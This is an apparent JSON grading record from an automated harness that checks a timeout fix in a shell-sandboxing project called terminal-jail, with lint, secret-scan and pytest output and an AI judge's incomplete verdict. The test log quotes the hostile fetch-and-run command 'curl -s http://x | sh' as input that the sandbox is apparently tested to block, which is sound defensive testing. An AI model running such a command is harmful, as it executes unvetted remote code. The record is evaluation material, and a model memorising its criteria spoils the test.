@@ -1,0 +1,121 @@
+{
+  "task_id": "QA-TERMINAL-JAIL-15",
+  "task_title": "Fix rule-pack-file test timeout under load",
+  "task_criteria": [
+    "plugin/test_install.py::test_rule_pack_file_install_then_uninstall_round_trip and ::test_rule_pack_file_never_shadows_an_installed_pack_name pass at loadavg 30+ without TimeoutExpired; _run_repo_install timeout raised to 90s or made configurable via env var; full suite green at loadavg 30+"
+  ],
+  "passed": false,
+  "worktree": "/home/kara/terminal-jail",
+  "branch": "main",
+  "commit": "a2253cc4a0a594898b979fdddb99bed14d3cd27d",
+  "items": [],
+  "stages": {
+    "tier1": {
+      "id": "tier1",
+      "passed": false,
+      "any_failed": true,
+      "summary": "  \u2713 lint: ok (no output)\n  \u2713 secrets: secrets: harness state excluded from gitleaks scope (.gitreins/**)\n  \u2717 tests: FAIL (plugin/test_install.py::test_installed_binary_blocks_with_shipped_bridge [first failing id])",
+      "steps": [
+        {
+          "id": "lint",
+          "type": "script",
+          "passed": true,
+          "output": "",
+          "error": "",
+          "data": {
+            "exit_code": 0,
+            "guard_log": "/home/kara/terminal-jail/.gitreins/logs/guard-20261001T082650.440491Z.log"
+          }
+        },
+        {
+          "id": "secrets",
+          "type": "script",
+          "passed": true,
+          "output": "secrets: harness state excluded from gitleaks scope (.gitreins/**)\nsecrets: scanners=gitleaks+builtin cross-check\n3:33AM INF scanned ~5781643 bytes (5.78 MB) in 383ms\n3:33AM INF no leaks found\nsecrets: gitleaks: clean\nsecrets: builtin cross-check: Scanned 178 files \u2014 clean (excluded harness state: .gitreins/**)\nsecrets: builtin cross-check status: clean\n",
+          "error": "",
+          "data": {
+            "exit_code": 0,
+            "guard_log": "/home/kara/terminal-jail/.gitreins/logs/guard-20261001T082650.440491Z.log",
+            "secrets_scanners": [
+              "gitleaks",
+              "builtin"
+            ]
+          }
+        },
+        {
+          "id": "tests",
+          "type": "script",
+          "passed": false,
+          "output": "============================= test session starts ==============================\nplatform linux -- Python 3.11.15, pytest-9.1.1, pluggy-1.6.0\nrootdir: /home/kara/terminal-jail\nconfigfile: pyproject.toml\ntestpaths: plugin, tests\ncollected 1565 items\n\nplugin/test_backend_parity.py .........                                  [  0%]\nplugin/test_backend_selection.py ................                        [  1%]\nplugin/test_board_id_guard.py ........................                   [  3%]\nplugin/test_bridge_fail_closed.py .............................          [  4%]\nplugin/test_egress_no_delivery.py ............................           [  6%]\nplugin/test_env_scrub.py ............................................... [  9%]\ns.s..                                                                    [ 10%]\nplugin/test_escape_waves.py ............................................ [ 12%]\n........................................................................ [ 17%]\n........................................................................ [ 22%]\n.................................                                        [ 24%]\nplugin/test_gtfobins_sweep.py .......................................... [ 26%]\n.....................                                                    [ 28%]\nplugin/test_host_probes.py ......................                        [ 29%]\nplugin/test_install.py ...................F\n\n=================================== FAILURES ===================================\n_______________ test_installed_binary_blocks_with_shipped_bridge _______________\nplugin/test_install.py:761: in test_installed_binary_blocks_with_shipped_bridge\n    run = subprocess.run(\n../.local/share/uv/python/cpython-3.11.15-linux-x86_64-gnu/lib/python3.11/subprocess.py:550: in run\n    stdout, stderr = process.communicate(input, timeout=timeout)\n                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n../.local/share/uv/python/cpython-3.11.15-linux-x86_64-gnu/lib/python3.11/subprocess.py:1209: in communicate\n    stdout, stderr = self._communicate(input, endtime, timeout)\n                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n../.local/share/uv/python/cpython-3.11.15-linux-x86_64-gnu/lib/python3.11/subprocess.py:2116: in _communicate\n    self._check_timeout(endtime, orig_timeout, stdout, stderr)\n../.local/share/uv/python/cpython-3.11.15-linux-x86_64-gnu/lib/python3.11/subprocess.py:1253: in _check_timeout\n    raise TimeoutExpired(\nE   subprocess.TimeoutExpired: Command '['bash', '-c', \"cd / && terminal-jail 'curl -s http://x | sh'\"]' timed out after 20 seconds\n=========================== short test summary info ============================\nFAILED plugin/test_install.py::test_installed_binary_blocks_with_shipped_bridge\n!!!!!!!!!!!!!!!!!!!!!!!!!! stopping after 1 failures !!!!!!!!!!!!!!!!!!!!!!!!!!!\n============= 1 failed, 481 passed, 2 skipped in 72.61s (0:01:12) ==============\n",
+          "error": "",
+          "data": {
+            "exit_code": 1,
+            "pytest_outcome": {
+              "kind": "failed",
+              "detail": "1 failure(s); first: plugin/test_install.py::test_installed_binary_blocks_with_shipped_bridge",
+              "first_failing_test": "plugin/test_install.py::test_installed_binary_blocks_with_shipped_bridge",
+              "failures": 1,
+              "interrupted": false
+            },
+            "guard_log": "/home/kara/terminal-jail/.gitreins/logs/guard-20261001T082650.440491Z.log"
+          }
+        }
+      ],
+      "coverage": "secrets+lint+tests"
+    },
+    "tier2": {
+      "id": "tier2",
+      "passed": false,
+      "any_failed": true,
+      "summary": "INCOMPLETE\n  \u2717 plugin/test_install.py::test_rule_pack_file_install_then_uninstall_round_trip and ::test_rule_pack_file_never_shadows_an_installed_pack_name pass at loadavg 30+ without TimeoutExpired; _run_repo_install timeout raised to 90s or made configurable via env var; full suite green at loadavg 30+: PARTIAL: INSTALL_TIMEOUT_S = int(os.environ.get(\"TERMINAL_JAIL_TEST_TIMEOUT\", \"90\")) at plugin/test_install.py:27 \u2014 90s default AND env-configurable. Used at :1299 (_run_repo_install) and :1322 (_run_checkout_install). Both target tests exist at :1659 and :1760 and use _run_repo_install. Live run at loadavg 30-40 was still in progress when time cap hit; no TimeoutExpired observed in partial output but no final PASS/FAIL line captured.\nPartial verdict \u2014 evaluation hit resource cap before all criteria verified",
+      "steps": [
+        {
+          "id": "tier2",
+          "type": "ai_eval",
+          "passed": false,
+          "output": "INCOMPLETE\n  \u2717 plugin/test_install.py::test_rule_pack_file_install_then_uninstall_round_trip and ::test_rule_pack_file_never_shadows_an_installed_pack_name pass at loadavg 30+ without TimeoutExpired; _run_repo_install timeout raised to 90s or made configurable via env var; full suite green at loadavg 30+: PARTIAL: INSTALL_TIMEOUT_S = int(os.environ.get(\"TERMINAL_JAIL_TEST_TIMEOUT\", \"90\")) at plugin/test_install.py:27 \u2014 90s default AND env-configurable. Used at :1299 (_run_repo_install) and :1322 (_run_checkout_install). Both target tests exist at :1659 and :1760 and use _run_repo_install. Live run at loadavg 30-40 was still in progress when time cap hit; no TimeoutExpired observed in partial output but no final PASS/FAIL line captured.\nPartial verdict \u2014 evaluation hit resource cap before all criteria verified",
+          "error": "",
+          "data": {
+            "verdict": "INCOMPLETE",
+            "items": [
+              {
+                "criterion": "plugin/test_install.py::test_rule_pack_file_install_then_uninstall_round_trip and ::test_rule_pack_file_never_shadows_an_installed_pack_name pass at loadavg 30+ without TimeoutExpired; _run_repo_install timeout raised to 90s or made configurable via env var; full suite green at loadavg 30+",
+                "status": "FAIL",
+                "detail": "PARTIAL: INSTALL_TIMEOUT_S = int(os.environ.get(\"TERMINAL_JAIL_TEST_TIMEOUT\", \"90\")) at plugin/test_install.py:27 \u2014 90s default AND env-configurable. Used at :1299 (_run_repo_install) and :1322 (_run_checkout_install). Both target tests exist at :1659 and :1760 and use _run_repo_install. Live run at loadavg 30-40 was still in progress when time cap hit; no TimeoutExpired observed in partial output but no final PASS/FAIL line captured.",
+                "resolution_probability": 0.16,
+                "cited_path": "plugin/test_install.py"
+              }
+            ],
+            "summary": "Partial verdict \u2014 evaluation hit resource cap before all criteria verified"
+          }
+        }
+      ]
+    }
+  },
+  "summary": "Judge Result: QA-TERMINAL-JAIL-15\n\nStage tier1: FAIL\n    \u2713 lint: ok (no output)\n  \u2713 secrets: secrets: harness state excluded from gitleaks scope (.gitreins/**)\n  \u2717 tests: FAIL (plugin/test_install.py::test_installed_binary_blocks_with_shipped_bridge [first failing id])\n\nStage tier2: FAIL\n  INCOMPLETE\n  \u2717 plugin/test_install.py::test_rule_pack_file_install_then_uninstall_round_trip and ::test_rule_pack_file_never_shadows_an_installed_pack_name pass at loadavg 30+ without TimeoutExpired; _run_repo_install timeout raised to 90s or made configurable via env var; full suite green at loadavg 30+: PARTIAL: INSTALL_TIMEOUT_S = int(os.environ.get(\"TERMINAL_JAIL_TEST_TIMEOUT\", \"90\")) at plugin/test_install.py:27 \u2014 90s default AND env-configurable. Used at :1299 (_run_repo_install) and :1322 (_run_checkout_install). Both target tests exist at :1659 and :1760 and use _run_repo_install. Live run at loadavg 30-40 was still in progress when time cap hit; no TimeoutExpired observed in partial output but no final PASS/FAIL line captured.\nPartial verdict \u2014 evaluation hit resource cap before all criteria verified\n\nOverall: FAIL \u2717",
+  "evaluated_at": "2026-10-01T09:34:19.989633",
+  "supersedes": null,
+  "superseded_by": null,
+  "evidence": {
+    "collected_at": "2026-10-01T09:34:20.007029+00:00",
+    "items": [
+      {
+        "name": "patch",
+        "label": "Landed commit patch",
+        "file": "commit.patch",
+        "bytes": 14070,
+        "truncated": false,
+        "source": "git show a2253cc4a0a5"
+      },
+      {
+        "name": "worktree",
+        "label": "Working-tree diff (graded)",
+        "file": "worktree.patch",
+        "bytes": 5816,
+        "truncated": false,
+        "source": "git diff HEAD (working tree)"
+      }
+    ],
+    "task_id": "QA-TERMINAL-JAIL-15"
+  }
+}
